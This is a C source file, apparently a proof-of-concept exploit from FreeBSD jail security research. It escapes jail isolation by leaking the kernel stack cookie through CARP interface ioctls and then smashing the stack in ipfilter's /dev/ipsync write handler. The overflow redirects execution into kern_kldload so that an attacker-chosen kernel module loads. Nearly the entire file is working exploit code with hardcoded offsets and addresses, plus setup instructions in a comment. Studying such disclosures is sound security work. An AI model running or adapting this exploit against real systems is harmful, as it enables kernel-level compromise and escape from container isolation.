#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <net/if.h>
#include <netinet/ip_carp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/user.h>
#include <unistd.h>

#define u_32_t unsigned int

#define NUM_CARP_IFS 12
#define IF_NAME "epair100b"

#define KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0

typedef struct synchdr {
  u_32_t sm_magic; /* magic */
  u_char sm_v;     /* version: 4,6 */
  u_char sm_p;     /* protocol */
  u_char sm_cmd;   /* command */
  u_char sm_table; /* NAT, STATE, etc */
  u_int sm_num;    /* table entry number */
  int sm_rev;      /* forward/reverse */
  int sm_len;      /* length of the data section */
  void* sm_sl;     /* back pointer to parent */
} synchdr_t;

/*
Prerequisites
-------------
1. Host must have carp kernel module loaded

sysrc kld_list+="carp"
kldload carp

2. Host must have ipfilter kernel module loaded

sysrc kld_list+="ipfilter"
kldload ipfilter


3. ipfilter device /dev/ipsync must be visible in jail

cat << 'EOF' > /etc/devfs.rules
[devfsrules_ipf=5]
add path ipsync    unhide
EOF

service devfs restart
service jail restart prisonbreak
*/

void cyclic(char* buf, size_t len) {
  const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const char set2[] = "abcdefghijklmnopqrstuvwxyz";
  const char set3[] = "0123456789";

  size_t pos = 0;

  for (size_t i = 0; i < sizeof(set1) - 1; i++) {
    for (size_t j = 0; j < sizeof(set2) - 1; j++) {
      for (size_t k = 0; k < sizeof(set3) - 1; k++) {
        if (pos + 3 > len) return;

        buf[pos++] = set1[i];
        buf[pos++] = set2[j];
        buf[pos++] = set3[k];

        if (pos >= len) return;
      }
    }
  }
}

unsigned long get_td() {
  int mib[4];
  struct kinfo_proc kp;
  size_t len = sizeof(kp);
  pid_t pid = getpid();

  /* mib = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid } */
  mib[0] = CTL_KERN;
  mib[1] = KERN_PROC;
  mib[2] = KERN_PROC_PID;
  mib[3] = pid;

  if (sysctl(mib, 4, &kp, &len, NULL, 0) == -1) {
    err(1, "sysctl(KERN_PROC_PID)");
  }

  if (len < sizeof(kp)) {
    fprintf(stderr, "sysctl returned too little data (len=%zu)\n", len);
    return 1;
  }

  return (unsigned long)kp.ki_tdaddr;
}

void* prisonbreak(void* arg) {
  /*
   *
   * 1. Get the stack cookie through a kernel memory leak bug
   *
   * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
   */

  int sock;
  struct carpreq carpr_set;
  struct carpreq carpr_get[NUM_CARP_IFS];
  struct ifreq ifr_set;
  struct ifreq ifr_get;
  uint64_t stack_cookie;

  bzero(&carpr_set, sizeof(struct carpreq));
  bzero(carpr_get, sizeof(carpr_get));

  ifr_get.ifr_data = (caddr_t)&carpr_get;
  ifr_set.ifr_data = (caddr_t)&carpr_set;

  carpr_get[0].carpr_vhid = 0;  // Instruct kernel we want info on all carp interfaces
  carpr_get[0].carpr_count = NUM_CARP_IFS;

  strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
  strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) {
    perror("socket");
    exit(1);
  }

  // Create some carp interfaces.
  // We need more than one carp interface defined on one physical interface to
  // force the kernel to trigger the implementation bug that causes the memory
  // leak. See
  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
  //
  // NOTE(m): Defining multiple carp interfaces on one physical interface does
  // not seem possible using `ifconfig(8)`, either by design or because of a
  // subtle locking bug (see
  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
  for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
    carpr_set.carpr_vhid = i;
    if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
      perror("ioctl");
      exit(1);
    }
  }

  // Enumerate the carp interfaces...
  // and leak some kernel memory while we're at it,
  // i.e. get an unsuspecting prison guard's access badge.
  if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
    perror("ioctl");
    exit(1);
  }

  // Extract the stack cookie from the leaked kernel memory
  const unsigned char* base = (const unsigned char*)carpr_get;
  size_t offset_stack_cookie = sizeof(struct carpreq);  // start of carpr_get[1]
  memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
  printf("STACK COOKIE: 0x%016" PRIx64 "\n", stack_cookie);

  close(sock);

  /*
   *
   * 2. Use the retrieved stack cookie in a stack smash attack
   *
   * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
   */

  int fd = open("/dev/ipsync", O_RDWR);

  if (fd < 0) {
    printf("Error: failed to open /dev/ipsync\n");
    exit(0);
  }

  // We need to write len bytes to the char data[2048] local buffer allocated by
  // `ipf_sync_write()` in sys/netpfil/ipfilter/netinet/ip_sync.c:420 in order
  // to overflow the stack with data we control. The calculated length accounts
  // for other locals, padding, the stack cookie, saved registers, the caller's
  // frame pointer and finally the saved return address.
  // In other words: we need to dig a long enough tunnel.
  int len = 2896;
  synchdr_t* header = malloc(len);

  // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
  // memset(header, 0x41, len);

  // Fill the buffer with cyclic data to make it easy to calculate offsets
  cyclic((char*)header, len);

  unsigned long* kernel_module_path = (unsigned long*)(header + sizeof(synchdr_t));
  strcpy((char*)kernel_module_path, "./prisonbreak.ko");

  // Restore the stack cookie at the location we know it should go using the
  // value extracted earlier to please the stack protection checker 2048 + 32 =
  // 2080 (start of our overflow) + 752 bytes = 2832
  // i.e. use the badge we got off that guard.
  int stack_cookie_offset = 2832;
  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
  *ptr = stack_cookie;

  // Overwrite the address where kern_kldload is going to read the td argument
  int td_offset = 2872;
  ptr = (unsigned long*)((char*)header + td_offset);
  *ptr = get_td();

  // Overwrite the address where kern_kldload is going to read the string
  // containing our custom kernel module path
  int kernel_module_path_offset = 2864;
  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
  *ptr = (unsigned long)kernel_module_path;

  // Overwrite the address where kern_kldload is going to read the fileid
  int fileid_offset = 2840;
  ptr = (unsigned long*)((char*)header + fileid_offset);
  *ptr = 0;

  // Restore $rbp
  int rbp_offset = 2880;
  ptr = (unsigned long*)((char*)header + rbp_offset);
  *ptr = 0xfffffe0070e09cc0;

  // Overwrite the return address to jump into something we can use, e.g.
  // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
  // = 2888
  int return_address_offset = 2888;
  ptr = (unsigned long*)((char*)header + return_address_offset);
  unsigned long kern_kldload = KERN_KLDLOAD_ADDRESS;
  // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
  // making sure none of the guards spot us.
  unsigned long jump_to_address = kern_kldload + 69;
  *ptr = jump_to_address;

  // Populate the header with expected values so we pass all the checks and get
  // to where we need to be, i.e. have another inmate create a diversion by setting their mattress on fire.
  header->sm_magic = htonl(0x0FF51DE5);
  header->sm_v = 4;
  header->sm_p = 4;
  header->sm_cmd = 1;  // 0 here causes a NAT expire event to trigger at some point in the future,
                       // resulting in a host panic. We don't want the alarm to go off.
  header->sm_table = 0;
  header->sm_num = 0;
  header->sm_rev = 0;
  header->sm_len = htonl(len - sizeof(synchdr_t));
  header->sm_sl = NULL;

  int wlen = write(fd, header, len);
  if (wlen == -1) {
    perror("Error writing to /dev/ipsync");
    printf("errno: %d\n", errno);
  }

  printf("FAILED to break out of prison. You have died of this and Terry.\n");
  close(fd);

  return NULL;
}

int main() {
  pthread_t thread1;

  if (pthread_create(&thread1, NULL, prisonbreak, NULL) != 0) {
    perror("pthread_create");
    return 1;
  }

  sleep(2);

  return 0;
}
